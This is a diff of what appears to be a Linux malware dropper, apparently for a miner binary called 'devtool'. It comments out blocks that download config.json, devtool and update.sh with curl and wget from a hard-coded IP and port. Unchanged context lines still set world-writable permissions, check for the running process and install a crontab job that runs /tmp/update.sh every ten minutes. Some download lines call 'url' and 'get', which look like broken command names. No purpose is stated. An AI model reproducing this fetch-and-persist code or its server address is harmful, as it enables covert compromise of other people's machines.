@@ -168,7 +168,7 @@ if [ -f "$rtdir" ]
 #                        elif [ -f "$ccdira" ]
 #                        then
 #                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
-        fi
+#        fi
         chmod 777 /etc/devtool
         ps -fe|grep devtool |grep -v grep
         if [ $? -ne 0 ]
@@ -197,45 +197,45 @@ if [ -f "$rtdir" ]
         rm /tmp/config.json*
         rm /tmp/update.sh*
         [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/10 * * * * sh /tmp/update.sh >/dev/null 2>&1") | crontab -
-        if [ -f "$bbdir" ]
-                        then
-                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /tmp/config.json
-                        elif [ -f "$bbdira" ]
-                        then
-                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /tmp/config.json
-                        elif [ -f "$ccdir" ]
-                        then
-                            wget --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
-                        elif [ -f "$ccdira" ]
-                        then
-                            get --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
-        fi
-        if [ -f "$bbdir" ]
-                        then
-                             curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /tmp/devtool
-                        elif [ -f "$bbdira" ]
-                        then
-                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /tmp/devtool
-                        elif [ -f "$ccdir" ]
-                        then
-                                    wget --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
-                                elif [ -f "$ccdira" ]
-                                then
-                                    get --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
-        fi
-        if [ -f "$bbdir" ]
-            then
-                    curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /tmp/update.sh
-                elif [ -f "$bbdira" ]
-                then
-                    url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /tmp/update.sh
-                elif [ -f "$ccdir" ]
-                then
-                    wget --timeout=10 --tries=100 -P /tmp  http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
-                elif [ -f "$ccdira" ]
-                then
-                    get --timeout=10 --tries=100 -P /tmp  http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
-        fi 
+#        if [ -f "$bbdir" ]
+#                        then
+#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /tmp/config.json
+#                        elif [ -f "$bbdira" ]
+#                        then
+#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /tmp/config.json
+#                        elif [ -f "$ccdir" ]
+#                        then
+#                            wget --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
+#                        elif [ -f "$ccdira" ]
+#                        then
+#                            get --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
+#        fi
+#        if [ -f "$bbdir" ]
+#                        then
+#                             curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /tmp/devtool
+#                        elif [ -f "$bbdira" ]
+#                        then
+#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /tmp/devtool
+#                        elif [ -f "$ccdir" ]
+#                        then
+#                                    wget --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
+#                                elif [ -f "$ccdira" ]
+#                                then
+#                                    get --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
+#        fi
+#        if [ -f "$bbdir" ]
+#            then
+#                    curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /tmp/update.sh
+#                elif [ -f "$bbdira" ]
+#                then
+#                    url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /tmp/update.sh
+#                elif [ -f "$ccdir" ]
+#                then
+#                    wget --timeout=10 --tries=100 -P /tmp  http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
+#                elif [ -f "$ccdira" ]
+#                then
+#                    get --timeout=10 --tries=100 -P /tmp  http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
+#        fi 
         ps -fe|grep devtool |grep -v grep
         if [ $? -ne 0 ]
             then
